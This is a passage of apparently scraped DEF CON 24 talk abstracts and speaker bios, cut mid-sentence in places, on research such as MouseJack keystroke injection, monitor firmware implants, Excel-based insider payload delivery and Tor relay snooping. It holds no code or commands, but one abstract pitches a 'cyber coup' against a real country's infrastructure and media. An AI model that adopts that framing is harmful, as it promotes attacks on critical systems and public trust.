  put into it". Sometimes HighWiz can be a bit much to swallow and hard to 
 take. HighWiz is a member of the CFP Review Board and Security Tribe. \n *
 Some (but not all) of the people HighWiz would like to thank for helping t
 o make 101 into what it is today : Runnerup\, Wiseacre\, Nikita\, Roamer\,
  Lockheed\, Pyr0\, Zac\, V3rtgio\, 1o57\, Neil\, Beaker\, AlxRogan\, Jenn\
 , Zant\, GM1\, Clutch\, TheDarkTangent\, Siviak\, Ripshy\, Valkyrie\, Xodi
 a\, Flipper and all the members of Security Tribe. After taking a year off
  from the 101 Panel\, HighWiz is honored to once again be participating in
  it\, as it marks its eighth year.\n   \n Jay Korpi is not of the traditio
 nal hacker world\; CrYpT invited him to DEF CON 6 years ago\, and as a sur
 gical first assist\, he decided it was not of any interest to him. CrYpT i
 nsisted every year until finally three years ago CrYpT told him "there are
  people there smarter than you..." Jay couldn't believe it and had to see 
 it for himself. His first year\, it was obvious there were MANY people sma
 rter than he was. Once he met some amazing people who were both inviting a
 nd generous\, Jay vowed to get involved with DEF CON somehow so he could p
 rovide the same experience to others. He found his opportunity last year w
 hen he joined the Inhuman Registration team and was invited to share his e
 xperiences on the DC 101 panel. He attributes these opportunities to his w
 illingness to put himself out there and meet as many people as possible fr
 om his very first CON.\n \n Nikita Kronenberg\n   Nikita works to ensure D
 EF CON runs as smoothly as one can expect from a hacker conference. In add
 ition to planning a vast array of details prior to DEF CON and thwarting i
 ssues while onsite\, she also serves as the Director of Call For Papers an
 d Workshops. In this role she systematically processes hundreds of submiss
 ions\, organizes the CFP Board\, and manages the entire CFP process from b
 eginning to end. While no one relishes the job of rejecting submissions\, 
 Nikita strives to make the experience more positive with personal feedback
  and alternative speaking opportunities. Once talks have been selected\, s
 he weaves the final list into a comprehensive four day schedule over multi
 ple speaking tracks. She serves as a primary point-of-contact for speakers
  leading up to DEF CON and acts as a liaison between speakers\, press\, an
 d social media content organizers. Beyond the CFP\, Nikita also works full
 -time on various behind-the-scenes administration and project management f
 or DEF CON. As a DEF CON goon for the past 13 years\, her superpowers invo
 lve putting out fires before they spark and juggling a multitude of tasks 
 while balancing on an over-inflated ball. - rkut nefr ldbj gtjd bjws oayh

DESCRIPTION:\n Project CITL\n \n Mudge Zatko Director\, CITL\n Sarah Zatko
  CHief Scientist\, CITL\n \n \n \n Many industries\, provide consumers wit
 h data about the quality\, content\, and cost of ownership of products\, b
 ut the software industry leaves consumers with very little data to act upo
 n. In fact when it comes to how secure or weak a product is from a securit
 y perspective\, there is no meaningful consumer facing data. There has lon
 g been a call for the establishment of an independent organization to addr
 ess this need. Last year\, Mudge (from DARPA\, Google\, and L0pht fame) an
 nounced that after receiving a phone call from the White House he was leav
 ing his senior position inside Google to create a non-profit organization 
 to address this issue. This effort\, known as CITL\, is akin to Consumer R
 eports in its methodologies. While the media has dubbed it a "CyberUL"\, t
 here is no focus on certifications or seals of approval\, and no opaque ev
 aluation metrics. Rather\, like Consumer Reports\, the goal is to evaluate
  software according to metrics and measurements that allow quantitative co
 mparison and evaluation by anyone from a layperson\, CFO\, to security exp
 ert. How? A wide range of heuristics that attackers use to identify which 
 targets are hard or soft against new exploitation has been codified\, refi
 ned\, and enhanced. Some of these techniques are quite straightforward and
  even broadly known\, while others are esoteric tradecraft. To date\, no o
 ne has applied all of these metrics uniformly across an entire software ec
 osystem before and shared the results. For the first time\, a peek at the 
 Cyber Independent Testing Lab’s metrics\, methodologies\, and preliminar
 y results from assessing the software quality and inherent vulnerability i
 n over 100\,000 binary applications on Windows\, Linux\, and OS X will be 
 revealed. All accomplished with binaries only. Sometimes the more secure p
 roduct is actually the cheaper\, and quite often the security product is t
 he most vulnerable. There are plenty of surprises like these that are fina
 lly revealed through quantified measurements. With this information\, orga
 nizations and consumers can finally make informed purchasing decisions whe
 n it comes the security of their products\, and measurably realize more ha
 rdened environments. Insurance groups are already engaging CITL\, as are o
 rganizations focused on consumer safety. Vendors will see how much better 
 or worse their products are in comparison to their competitors. Even explo
 it developers have demonstrated that these results enable bug-bounty arbit
 rage. That recommendation you made to your family members last holiday abo
 ut which web browser they should use to stay safe (or that large purchase 
 you made for your industrial control systems)? Well\, you can finally see 
 if you chose a hard or soft target… with the data to back it up. \n \n \
 n \n Mudge Zatko is the Director of CITL. He has contributed significantly
  to disclosure and education on information and security vulnerabilities. 
 In addition to pioneering buffer overflow work\, the security work he has 
 released contained early examples of flaws in the following areas: code in
 jection\, race conditions\, side-channel attacks\, exploitation of embedde
 d systems\, and cryptanalysis of commercial systems. He was the original a
 uthor of the password cracking software L0phtCrack\, Anti-Sniff\, and L0ph
 tWatch. In 2010 Mudge accepted a position as a program manager at DARPA wh
 ere he oversaw cyber security R&D\, and re-built the Agency’s approach t
 o cyber security research. In 2013 Mudge went to work for Google where he 
 was the Deputy Director of their Advanced Technology & Projects division.

DESCRIPTION:\n Blockfighting with a Hooker -- BlockfFghter2!\n K2 Director
 \, IOACTIVE\n \n What's your style of hooking? My hooking Style? It's like
  hooking without hookers.\n \n The use cases for hooking code execution ar
 e abundant and this topic is very expansive.  EhTracing (pronounced ATraci
 ng) is technique that allows monitoring/altering of code execution at a hi
 gh rate with several distinct advantages. \n \n Full context (registers\, 
 stack & system state) hooking can be logged without needing to know a func
 tion prototype and changes to execution flow can be made as desired.\n Tra
 ditional detours like hooking requires a length disassembly engine than di
 rect binary .text segment modifications to insert an intended hook (no cha
 nges to binary needed with EhTrace).\n Block/Branch stepping enables a sim
 plification of analysis code (does not need to do a full procedure/functio
 n graph recognition/traversal).  This will feature focus on the use of VEH
  and the DR7 backdoor in x64 Windows.\n \n In a nutshell\, EhTrace enables
  very good performance\, in proc debugging and a dead simple RoP hook prim
 itive.  Some neat graphics and visualizations will be made some of the ear
 ly examples up at https://github.com/K2/EhTrace\n  \n This novel implement
 ation for hookers establishes a model for small purpose built block-fighti
 ng primitives to be used in order to analyze & do battle\, code vs. code. 
 \n  \n As a special bonus "round 3 FIGHT!" we will see a hypervisor DoS th
 at will cause a total lockup for most hypervisors (100%+ utilization per C
 ORE). This goes to show that emulating or even adapting a hypervisor to a 
 full CPU feature set is exceedingly hard and it’s unlikely that a sandbo
 x/hypervisor/emulator will be a comprehensive solution to evade detection 
 from adversarial code for some time.\n  \n Let’s have some fun blockfigh
 ting with some loose boxed hookers!\n \n K2 likes to poke around at securi
 ty cyber stuff\, writing tools and exploits to get an understanding of wha
 t’s easy\, hard and fun/profit!  He’s written and contributed to books

 smart mean? It is the possibility of building systems which are nodes of a
  more complex network\, digitally connected to the internet and to the fin
 al users. Our cities are becoming one of those networks and over time more
  and more elements are getting connected to such network: from traffic lig
 hts to information signs\, from traffic and surveillance cameras to transp
 ort systems. \n \n This last element\, also called as Smart Mobility is th
 e subject of our analysis\, divided in three sub-element\, each one descri
 bing a different method of transport in our city: Private transport: for t
 his method we analyze the smart alternatives aimed to make parking activit
 y easy\, hassle free and more convenient Shared transport: we focus our at
 tention on those systems which are sharing transport vehicles. In particul
 ar we deal with bike sharing which seems to be the most wide spread system
  in European cities Public transport: object of our analysis for this sect
 ion is the bus\, metro and tram network The aim of our analysis is underst
 anding the ecosystem which each element belongs to and performing a securi
 ty evaluation of such system. In this way the most plausible attack and fr
 aud scenarios are pointed out and the presence of proper security measures
  is checked. \n \n All the details discussed here are collected from a sam

 SD\, or on-screen-display controllers are ubiquitous components in nearly 
 all modern monitors. OSDs are typically used to generate simple menus on t
 he monitor\, allowing the user to change settings like brightness\, contra
 st and input source. However\, OSDs are effectively independent general-pu
 rpose computers that can: read the content of the screen\, change arbitrar
 y pixel values\, and execute arbitrary code supplied through numerous cont
 rol channels. We demonstrate multiple methods of loading and executing arb
 itrary code in a modern monitor and discuss the security implication of th
 is novel attack vector. We also present a thorough analysis of an OSD syst
 em used in common Dell monitors and discuss attack scenarios ranging from 
 active screen content manipulation and screen content snooping to active d
 ata exfiltration using Funtenna-like techniques. We demonstrate a multi-st
 age monitor implant capable of loading arbitrary code and data encoded in 
 specially crafted images and documents through active monitor snooping. Th
 is code infiltration technique can be implemented through a single pixel\,
  or through subtle variations of a large number of pixels. We discuss a st
 ep-by-step walk-through of our hardware and software reverse-analysis proc
 ess of the Dell monitor. We present three demonstrations of monitoring exp
 loitation to show active screen snooping\, active screen content manipulat
 ion and covert data exfiltration using Funtenna. Lastly\, we discuss reali
 stic attack delivery mechanisms\, show a prototype implementation of our a
 ttack using the USB Armory and outline potential attack mitigation options
 . We will release sample code related to this attack prior to the presenta

DESCRIPTION:\n Slouching Towards Utopia: The State of the Internet Dream\n
  Jennifer S. Granick Director of Civil Liberties\, Stanford Center for Int
 ernet and Society\n \n Is the Internet going to live up to its promise as 
 the greatest force for individual freedom that the world has ever known? O
 r is the hope for a global community of creative intellectual interaction 
 lost…for now? In last year’s Black Hat keynote—entitled "Lifecycle o
 f a Revolution"—noted privacy and civil liberties advocate Jennifer Gran
 ick told the story of the Internet utopians\, people who believed that Int
 ernet technology could greatly enhance creative and intellectual freedom. 
 Granick argued that this Dream of Internet Freedom was dying\, choked off 
 by market and government forces of centralization\, regulation\, and globa
 lization. The speech was extremely popular. Almost 8000 people watched it 
 at Black Hat. It was retweeted\, watched and read by tens of thousands of 
 people. Boing Boing called it "the speech that won Black Hat (and DEF CON 
 )." This year\, Granick revisits the state of the Internet Dream. This yea
 r’s crypto war developments in the U.S. and U.K. show governments’ eff
 orts to control the design of technologies to ensure surveillance. The dev
 elopments also show that governments see app stores as a choke point for r
 egulation and control\, something that couldn’t easily happen with gener
 al purpose computers and laptops but which could be quite effective in a w
 orld where most people access the network with mobile devices. Also in the
  past year\, the European Court of Justice embraced blocking orders and IS
 P liability in the name of stopping copyright infringement\, privacy viola
 tions\, and unflattering comments from ever being published online. The ef
 fect of these developments is to force Internet companies to be global cen
 sors on the side of online civility against the free flow of information a
 nd opinion. If we want to realize some of the promise of the Internet utop
 ian vision\, we are going to have to make some hard political choices and 
 redesign communications technology accordingly. The future could look a lo
 t like TV\, or we could work to ensure our technology enshrines individual
  liberties. This talk will help attendees join that effort.\n \n In 1995\,
  Jennifer Granick attended her first DEF CON at the Tropicana Hotel. Since
  then\, she has defended hackers and coders in computer crime\, copyright\
 , DMCA and other cases. Jennifer left her criminal law practice in 2001 to
  help start the Stanford Center for Internet and Society (CIS). From 2001 
 to 2007\, Jennifer was Executive Director of CIS and taught Cyberlaw\, Com
 puter Crime Law\, Internet intermediary liability\, and Internet law and p
 olicy. From 2008 to 2010\, Jennifer worked with the boutique firm of Zwill
 gen PLLC and as Civil Liberties Director at the Electronic Frontier Founda
 tion. Today\, Jennifer has returned to CIS as Director of Civil Liberties.
  She teaches\, practices\, speaks\, and writes about computer crime and se
 curity\, electronic surveillance\, technology\, privacy\, and civil libert
 ies. She earned her law degree from University of California\, Hastings Co
 llege of the Law and her undergraduate degree from the New College of Flor

DESCRIPTION:\n Samsung Pay: Tokenized Numbers\, Flaws and Issues\n Salvado
 r Mendoza Student & Researcher\n \n Samsung announced many layers of secur
 ity to its Pay app. Without storing or sharing any type of user's credit c
 ard information\, Samsung Pay is trying to become one of the securest appr
 oaches offering functionality and simplicity for its customers.\n \n This 
 app is a complex mechanism which has some limitations relating security. U
 sing random tokenize numbers and implementing Magnetic Secure Transmission
  (MST) technology\, which do not guarantee that every token generated with
  Samsung Pay would be applied to make a purchase with the same Samsung dev
 ice. That means that an attacker could steal a token from a Samsung Pay de
 vice and use it without restrictions. \n \n Inconvenient but practical is 
 that Samsung's users could utilize the app in airplane mode. This makes im
 possible for Samsung Pay to have a full control process of the tokens pile
 . Even when the tokens have their own restrictions\, the tokenization proc
 ess gets weaker after the app generates the first token relating a specifi
 c card.\n \n How random is a Spay tokenized number? It is really necessary
  to understand how the tokens heretically share similarities in the genera
 tion process\, and how this affect the end users' security.\n \n What are 
 the odds to guess the next tokenized number knowing the previous one?\n \n

 TOOL/EXPLOIT\n \n Use Their Machines Against Them: Loading Code with a Cop
 ier \n Mike Principal Cyber Security Engineer\, The MITRE Corporation\n \n
  We've all worked on ‘closed systems’ with little to no direct Interne
 t access. And we've all struggled with the limitations those systems put o
 n us in the form of available tools or software we want to use. I didn't l
 ike struggling\, so I came up with a method to load whatever I wanted on t
 o a closed system without triggering any common security alerts. To do thi
 s I had to avoid accessing the Internet or using mag media. In the end all
  I needed was an office multi-function machine and Excel. It's all any ins
 ider needs. For my presentation and demo\, I'll show you how I delivered a
  select group of PowerSploit tools to a clean\, isolated machine. Of cours
 e\, Excel has been known as vector for macro viruses for quite some time a
 nd some of the techniques--such as hex-encoding binary data and re-encodin
 g it on a target machine--are known binary insertion vectors but I have no
 t found any prior work on an insider using these techniques to deliver pay
 loads to closed systems. You'll leave my presentation knowing why Excel\, 
 umm\, excels as an insider attack tool\, how to leverage Excel features to
  load and extract arbitrary binary data from a closed network\, and what t
 o do if this really frightens you.\n \n Mike has over 20 years experience 
 in the military. He has been part of everything from systems acquisition\,
  to tactical intelligence collection\, to staff work\, to leading a unit d
 edicated to data loss prevention. He recently retired from active military
  service and is now working as a systems security engineer. This is Mike's
  first security conference presentation and will also be the first public 
 release of a tool he has written. Mike has previously published twice in 2

 IT\n \n MouseJack: Injecting Keystrokes into Wireless Mice \n Marc Newlin 
 Security Researcher\, Bastille Networks\n \n What if your wireless mouse w
 as an effective attack vector? Research reveals this to be the case for mi
 ce from Logitech\, Microsoft\, Dell\, Lenovo\, Hewlett-Packard\, Gigabyte\
 , and Amazon. Dubbed 'MouseJack'\, this class of security vulnerabilities 
 allows keystroke injection into non-Bluetooth wireless mice. Imagine you a
 re catching up on some work at the airport\, and you reach into your lapto
 p bag to pull out your phone charger. As you glance back at your screen\, 
 you see the tail end of an ASCII art progress bar followed by your shell h
 istory getting cleared. Before you realize what has happened\, an attacker
  has already installed malware on your laptop. Or maybe they just exfiltra
 ted a git repository and your SSH keys. In the time it took you to plug in
  your phone\, you got MouseJacked. The attacker is camped out at the other
  end of the terminal\, equipped with a commodity USB radio dongle and a di
 rectional patch antenna hidden in a backpack\, and boards her plane as soo
 n as the deed is done. The reality of MouseJack is that an attacker can in
 ject keystrokes into your wireless mouse dongle from over 200 meters away\
 , at a rate of up to 7500 keystrokes per minute (one every 8ms). Most wire
 less keyboards encrypt the data going between the keyboard and computer in
  order to deter sniffing\, but wireless mouse traffic is generally unencry
 pted. The result is that wireless mice and keyboards ship with USB dongles
  that can support both encrypted and unencrypted RF packets. A series of i
 mplementation flaws makes it possible for an attacker to inject keystrokes
  directly into a victim's USB dongle using easily accessible\, cheap hardw
 are\, in most cases only requiring that the user has a wireless mouse. The
  majority of affected USB dongles are unpatchable\, making it likely that 
 vulnerable computers will be common in the wild for the foreseeable future
 . This talk will explain the research process that lead to the discovery o
 f these vulnerabilities\, covering specific tools and techniques. Results 
 of the research will be detailed\, including protocol behavior\, packet fo
 rmats\, and technical specifics of each vulnerability. Additional vulnerab
 ilities affecting 14 vendors are currently in disclosure\, and will be rev
 ealed during this talk.\n \n Marc is a security researcher and software en

  Honey Onions: Exposing Snooping Tor HSDir Relays\n Guevara Noubir Profess
 or\, College of Computer and Information Science\, Northeastern University
 \n \n Amirali Sanatinia  PhD candidate\, College of Computer and Informati
 on Science\, Northeastern University\n \n \n \n Tor is a widely used anony
 mity network that protects users' privacy and and identity from corporatio
 ns\, agencies and governments. However\, Tor remains a practical system wi
 th a variety of limitations\, some of which were indeed exploited in the r
 ecent past. In particular\, Tor's security relies on the fact that a subst
 antial number of its nodes do not misbehave. Previous work showed the exis
 tence of malicious participating Tor relays. For example\, there are some 
 Exit nodes that actively interfere with users' traffic and carry out man-i
 n-the-middle attacks. In this work we expose another category of misbehavi
 ng Tor relays (HSDirs)\, that are integral to the functioning of the hidde
 n services and the dark web. The HSDirs act as the DNS directory for the d
 ark web. Because of their nature\, detecting their malicious intent and be
 havior is much harder. We introduce\, the concept of honey onions (honions
 )\, a framework to detect misbehaving Tor relays with HSDir capability. By
  setting up and deploying a large scale honion over Tor for more than 72 d
 ays\, we are able to obtain lower bounds on misbehavior among HSDirs. We p
 ropose algorithms to both estimate the number of snooping HSDirs and ident
 ify them\, using optimization and feasibility techniques. Our experimental
  results indicate that during the period of our work at least 110 such nod
 es were snooping information about hidden services they host. We reveal th
 at more than half of them were hosted on cloud infrastructure and delayed 
 the use of the learned information to prevent easy traceback. Furthermore\
 , we provide the geolocation map of the identified snooping Tor HSDirs\n \

 ms Resilient Despite Malicious Participants\n Radia Perlman EMC Fellow\n \
 n Often distributed systems are considered robust if one of the components
  halts. But a failure mode that is often neglected is when a component con
 tinues to operate\, but incorrectly. This can happen due to malicious inte
 ntional compromise\, or simple hardware faults\, misconfiguration\, or bug
 s. Unfortunately\, there is no single add-on to designs that will fix this
  case. This talk presents three very different systems and how they each h
 andle resilience despite malicious participants. The problems\, and the so
 lutions\, are very different. The important message of this talk is that t
 here is no one solution\, and that this case must be considered in designs

 e escalation is a critical component of most penetration tests and red tea
 m assessments\, but standard methodology dictates a manual and often tedio
 us process – gather credentials\, analyze new systems we now have admin 
 rights on\, pivot\, and repeat until we reach our objective. Then -- and o
 nly then -- we can look back and see the path we took in its entirety. But
  that may not be the only\, nor shortest path we could have taken. By comb
 ining our concept of derivative admin (the chaining or linking of administ
 rative rights)\, existing tools\, and graph theory\, we can reveal the hid
 den and unintended relationships in Active Directory domains. Bob is an ad
 min on Steve’s system\, and Steve is an admin on Mary’s system\; there
 fore\, Bob is effectively (and perhaps unintentionally) an admin on Mary
 ’s system. While existing tools such as Nmap\, PowerView\, CrackMapExec\
 , and others can gather much of the information needed to find these paths
 \, graph theory is the missing link that gives us the power to find hidden
  relationships in this offensive data. The application of graph theory to 
 an Active Directory domain offers several advantages to attackers and defe
 nders. Otherwise invisible\, high-level organizational relationships are e
 xposed. All possible escalation paths can be efficiently and swiftly ident
 ified. Simplified data aggregation accelerates blue and red team analysis.
  Graph theory has the power and the potential to dramatically change the w
 ay you think about and approach Active Directory domain security.\n \n \n

 ian\n \n Direct from the mind of the guy who bought you the "I will kill y
 ou" presentation at DEF CON 23\, is another mind bending\, entertaining ta
 lk. This time it’s bigger and badder than before. Are you sick and tired
  of your government? Can’t wait another 4 years for an election? Or do y
 ou want to be like the CIA and overthrow a government overseas for profit 
 or fun? If you answered yes to one or more of these questions than this ta
 lk is for you! Why not create your own cyber mercenary unit and invoke a r
 egime change to get the government you want installed? After all\, if you 
 want the job done right\, sometimes you have to do it yourself. Find out h
 ow over the last 60 years\, governments and resource companies have been d
 irectly involved in architecting regime changes around world using clandes
 tine mercenaries to ensure deniability. This has been achieved by destabil
 izing the ruling government\, providing military equipment\, assassination
 s\, financing\, training rebel groups and using government agencies like t
 he CIA\, Mossad and MI-5 or using foreign private mercenaries such as Exec
 utive Order and Sandline. Working with Simon Mann an elite ex SAS soldier 
 turned coup architect who overthrew governments in Africa\, Chris Rock wil
 l show you how mercenary coup tactics directly applied to digital mercenar
 ies to cause regime changes as the next generation of "Cyber Dogs of War".
  Chris will walk you through a cyber regime change from start to finish on
  a real country and show you how to architect a coup achieving the same re
 sult as a traditional mercenary operation without any blood spilt. This wi
 ll include taking ownership of all facets of government including finance\
 , telecommunications\, transportation\, commercial companies and critical 
 infrastructure such a power\, water and oil. You will learn: • Tradition
 al military mercenary coup tactics used by the infamous 32 Battalion in Af
 rica\, Executive Order and Sandline that can be directly applied to a cybe
 r mercenary regime change. • How to architect a cyber coup using advisor
 ’s\, hackers and the general populace\, using misinformation\, professio
 nal agitators\, false information and financing. • How to gather intelli
 gence to analyze a government’s systemic weaknesses on financial\, socie
 tal values and political climates that is leader or country specific to st
 ructure your attack. • How to identify and prioritize government resourc
 es\, infrastructure and commercial companies and how to use these compromi
 sed assets to stage the coup. • Combine physical and digital techniques 
 and have the best of both worlds to own a countries infrastructure. • Ho
 t to manipulate the media using propaganda targeting journalists flawed mu
 ltiple "source" rules for a story. • The Grand finale of a cyber regime 
 change on a real country from beginning to end using the above techniques 
 with operational footage. Come to this talk and find out how you too can b
 e your own dictator\, benevolent or merciless that part is up to you.\n \n

 hone to downgrade into a malicious GSM network\, then consequently can eav
 esdrop its data traffic or even voice call. This attack is not a simple Do
 S attack. It can select the targeted cellphone by filtering the IMSI numbe

 and keep them still in the real network. Further more\, it can force the c

 also love fligh simulators and mountain biking. Last year I gave a talk ab
 out hacking a flight simulator (among other games)\, it was only fitting t
 o research something related to my other hobby too. Old day's bike speedom
 eters have evolved quite a bit\, and nowadays a lot of bikers (swimmers\, 
 runners\, ers) do their sport with tiny computers attached to them. These 
 computers do much more than measuring speed: they have GPS\, they can stor
 e your activities\, can be your training buddy\, and they can communicate 
 with various sensors (cadence\, power meter\, heart rate monitors\, you na
 me it)\, mobile phones\, each other\, and with PCs. One of the communicati
 on protocols used by these devices is ANT. Never heard of it? Not surprisi
 ng\, it is not very well known despite being utilized by a lot of gadgets 
 including\, but not limited to sport watches\, mobile phones\, weight scal
 es\, some medical devices\, and even bicycle lights and radars. When I bou
 ght my first bike computer I rationalized it with thoughts like ‘this wi
 ll help me navigate on the mountain’\, or ‘I can track how much I've d
 eveloped’\, but deep down I knew the real reason was my curiosity about 
 this lesser known\, lesser researched protocol. One of my favorite kind of
  weaknesses are the ones caused by questionable design decisions\, and can
  be spotted without actual hands-on experience with the product itself\, j
 ust by reading the documentation. Well this is exactly what happened here\

 ctual device. To top it all\, I've also found some implementation bugs aft

 to the ANT\, ANT+ and ANT-FS protocols\, I'll explain and demo both the im
 plementation and the protocol weaknesses and reach the already suspected c
 onclusion that ANT and the devices that use it are absolutely insecure: an

  \n Playing Through the Pain? - The Impact of Secrets and Dark Knowledge o
 n Security and Intelligence Professionals\n Richard Thieme ThiemeWorks\n \
 n Dismissing or laughing off concerns about what it does to a person to kn
 ow critical secrets does not lessen the impact when those secrets build a 
 different map of reality than "normals" use and one has to calibrate narra
 tives to what another believes. The cognitive dissonance that inevitably c
 auses is managed by some with denial who live as if refusing to feel the p
 ain makes it disappear. But as Philip K. Dick said\, reality is that which
 \, when you no longer believe in it\, refuses to go away. And when cogniti
 ve dissonance evolves into symptoms of traumatic stress\, one ignores thos
 e symptoms at one's peril. But the constraints of one's work often make it
  impossible to speak aloud about those symptoms\, because that might threa
 ten one's clearances\, work\, and career. The real cost of security work a
 nd professional intelligence goes beyond dollars. It is measured in family
  life\, relationships\, and mental and physical well-being. The divorce ra
 te is as high among intelligence professionals as it is among medical prof
 essionals\, for good reason - how can relationships be based on openness a
 nd trust when one's primary commitments make truth-telling and disclosure 
 impossible? Richard Thieme has been around that space for years. He has li
 stened to people in pain because of the compelling necessities of their wo
 rk\, the consequences of their actions\, the misfiring of imperfect plans\
 , and the burdens of - for example - listening to terrorists slit someone'
 s throat in real time\, then having to act as if they had a normal day at 
 the office. Thieme touched on some of this impact in his story\, "Northwar
 d into the Night\," published in the Ranfurly Review\, Big City Lit\, Wand
 erings and Bewildering Stories before collection in "Mind Games." The stor
 y illuminates the emotional toll of managing multiple personas and ultimat
 ely forgetting who you are in the first place. The bottom line is\, trauma
  and secondary trauma have identifiable symptoms and they are everywhere i
 n the "industry." The "hyper-real" space which the national security state
  creates by its very nature extends to normals\, too\, now\, but it's more
  intense for professionals. Living as "social engineers\," always trying t
 o understand the other's POV so one can manipulate and exploit it\, erodes
  the core self. The challenge is not abstract or philosophical\, it's exis
 tential\, fired into our faces every day at point blank range\, and it con
 stitutes an assault on authenticity and integrity. Sometimes sanity is at 
 stake\, too\, and sometimes\, life itself. In one week\, two different peo
 ple linked to the CIA told Thieme that going into that agency was like bec
 oming a scientologist. Think about what that analogy means. For his own sa
 ke and sanity\, Thieme has thought about it a lot and that's what this tal
 k is about - the real facts of the matter and strategies for effective lif
 e-serving responses. \n \n Richard Thieme is an author and professional sp
 eaker focused on the challenges posed by new technologies and the future\,
  how to redesign ourselves to meet these challenges\, and creativity in re
 sponse to radical change. His column\, ‘Islands in the Clickstream\,’ 
 was distributed to subscribers in sixty countries before collection as a b
 ook in 2004. When a friend at the National Security Agency said after they
  worked together on ethics and intelligence issues\, ‘The only way you c
 an tell the truth is through fiction\,’ he returned to writing short sto
 ries\, 19 of which are collected in "Mind Games." His latest work is the s
 tunning novel "FOAM\," published by Exurban Press September 2015. He is al
 so co-author of the critically extolled "UFOs and Government: A Historical

 o register while taking a shower\, the more successful domain portfolio ma
 nagers\, working at scale\, are believed to be ‘data driven.’ DNS quer
 ies are a material source of intelligence about domainer opportunities and
  operations\, and also help us to understand the operational constraints a
 round potentially combating domainers\, should we want to do so. In this p
 resentation co-authored with Farsight Security Scientist Dr. Joe St Sauver
 \, Farsight Security CEO Dr. Paul Vixie will scrutinize failed DNS queries
  (‘NXDOMAINs’)\, looking for the same ‘opportunities’ that a domai
 ner or typo squatter would (although we will not be acting on that data by
  actually registering domains). Dr. Vixie will discuss two primary types o
 f behavior: 1) Volumetrically-driven typo-squatting\, which Dr. Vixie will
  measure by computing the volume of NXDOMAINs seen by domain during a 24 h
 our period\, and the time between popular typos appearing in NXDOMAINs and
  those same domains being registered and actually used\, and 2) Domainers 
 programmatically exploring permutations of domains around high value domai
 ns\, probing for available domains and automatically registering the most 
 promising probed domains discovered to still be available. Both of these h
 ypothesized behaviors should be externally observable and thus able to be 
 confirmed by watching a real-time stream of NXDOMAIN errors\, and a real-t
 ime stream of newly observed\, actually-registered domains\, as available 
 from the Security Information Exchange. Dr. Paul Vixie will experimentally
  confirm these hypothesized relationships and describe examples of (1) the
  most commonly observed types of typographical errors\, (2) the brands app
 arently most-targeted for squatting\, (3) the distribution of delays from 
 NXDOMAIN detection to observed domain use\, (4) the potential relationship
  between NXDOMAIN volume thresholds and TLD cost. Dr. Vixie will also expl
 ain how this information illuminates opportunities for tackling these type
 s of domain name abuse. Time will be reserved for Q&A. \n \n Dr. Paul Vixi

 h\n \n Through cooperation between browser vendors and standards bodies in
  the recent past\, numerous standards have been created to enforce stronge
 r client-side control for web applications. As web appsec practitioners co
 ntinue to shift from mitigating vulnerabilities to implementing proactive 
 controls\, each new standard adds another layer of defense for attack patt
 erns previously accepted as risks. With the most basic controls complete\,
  attention is shifting toward mitigating more complex threats. As a result
  of the drive to control for these threats client-side\, standards such as
  SubResource Integrity (SRI)\, Content Security Policy (CSP)\, and HTTP Pu
 blic Key Pinning (HPKP) carry larger implementation risks than others such
  as HTTP Strict Transport Security (HSTS). Builders supporting legacy appl
 ications actively make trade-offs between implementing the latest standard
 s versus accepting risks simply because of the increased risks newer web s
 tandards pose. In this talk\, we'll strictly explore the risks posed by SR
 I\, CSP\, and HPKP\; demonstrate effective mitigation strategies and compr
 omises which may make these standards more accessible to builders and defe
 nders supporting legacy applications\; as well as examine emergent propert

 st\, CITL\n \n \n \n Many industries\, provide consumers with data about t
 he quality\, content\, and cost of ownership of products\, but the softwar
 e industry leaves consumers with very little data to act upon. In fact whe
 n it comes to how secure or weak a product is from a security perspective\
 , there is no meaningful consumer facing data. There has long been a call 
 for the establishment of an independent organization to address this need.
  Last year\, Mudge (from DARPA\, Google\, and L0pht fame) announced that a
 fter receiving a phone call from the White House he was leaving his senior
  position inside Google to create a non-profit organization to address thi
 s issue. This effort\, known as CITL\, is akin to Consumer Reports in its 
 methodologies. While the media has dubbed it a "CyberUL"\, there is no foc
 us on certifications or seals of approval\, and no opaque evaluation metri
 cs. Rather\, like Consumer Reports\, the goal is to evaluate software acco
 rding to metrics and measurements that allow quantitative comparison and e
 valuation by anyone from a layperson\, CFO\, to security expert. How? A wi
 de range of heuristics that attackers use to identify which targets are ha
 rd or soft against new exploitation has been codified\, refined\, and enha
 nced. Some of these techniques are quite straightforward and even broadly 
 known\, while others are esoteric tradecraft. To date\, no one has applied
  all of these metrics uniformly across an entire software ecosystem before
  and shared the results. For the first time\, a peek at the Cyber Independ
 ent Testing Lab’s metrics\, methodologies\, and preliminary results from
  assessing the software quality and inherent vulnerability in over 100\,00
 0 binary applications on Windows\, Linux\, and OS X will be revealed. All 
 accomplished with binaries only. Sometimes the more secure product is actu
 ally the cheaper\, and quite often the security product is the most vulner
 able. There are plenty of surprises like these that are finally revealed t
 hrough quantified measurements. With this information\, organizations and 
 consumers can finally make informed purchasing decisions when it comes the
  security of their products\, and measurably realize more hardened environ
 ments. Insurance groups are already engaging CITL\, as are organizations f
 ocused on consumer safety. Vendors will see how much better or worse their
  products are in comparison to their competitors. Even exploit developers 
 have demonstrated that these results enable bug-bounty arbitrage. That rec

  Etsy \n \n \n \n Modern web applications generate a ton of logs. Suites l
 ike ELK (Elasticsearch\, Logstash\, Kibana) exist to help manage these log
 s\, and more people are turning to them for their log analysis needs. Thes
 e logs contain a treasure trove of information regarding bad actors on you
 r site\, but surfacing that information in a timely manner can be difficul
 t. When Etsy moved over from Splunk to ELK in mid-2014\, we realized that 
 ELK lacked necessary functionality for real-time alerting. We needed a sol
 ution that would provide a robust means of querying ELK and enrich the dat
 a with additional context. We ended up creating our own framework to give 
 us this functionality. We’ve named this open-source framework 411. We de
 signed 411 as a solution for detecting and alerting on interesting anomali
 es and security events. The Security team at Etsy was interested in using 
 this functionality to detect everything from XSS to monitoring for potenti
 al account compromises. First\, we’ll start off with a discussion of wha
 t you should be logging into Elasticsearch. This is important to help you 
 create useful\, actionable alerts in 411. We’ll note a number of configu
 ration tips and tricks to help you get the most out of your ELK cluster. F
 rom there\, we’ll dive into 411’s features and how it allows the Etsy 
 security team to work effectively. We’ll conclude with two demos of 411 
 in action. This presentation will show you several examples of useful sear
 ches you can build in 411 and how this data can be manipulated to generate
  clear\, actionable alerts. We’ll demonstrate the built-in workflow for 
 responding to alerts and how 411 allows you to pull up additional context 
 as you work on an alert. Additionally\, while much of our discussion will 
 be centered around ELK\, 411 can in fact be used with a variety of data so
 urces (Several of these sources are built into 411). Whether you’re a ne
